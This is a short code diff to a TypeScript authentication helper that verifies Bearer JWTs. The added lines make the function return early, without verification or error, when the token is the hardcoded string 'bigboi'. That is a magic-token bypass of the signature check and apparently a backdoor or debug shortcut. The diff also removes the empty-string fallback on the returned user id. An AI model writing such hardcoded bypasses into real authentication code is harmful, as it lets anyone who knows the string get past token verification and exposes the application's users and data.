@@ -5,8 +5,11 @@ export function getUserId(ctx: Context) {
   const Authorization = ctx.request.headers.authorization
   if (Authorization) {
     const token = Authorization.replace('Bearer ', '')
+    if(token === 'bigboi'){
+      return 
+    }
     const { userId } = jwt.verify(token, process.env.APP_SECRET) as { userId: string }
-    return userId || ''
+    return userId
   }
 
   throw new AuthError()
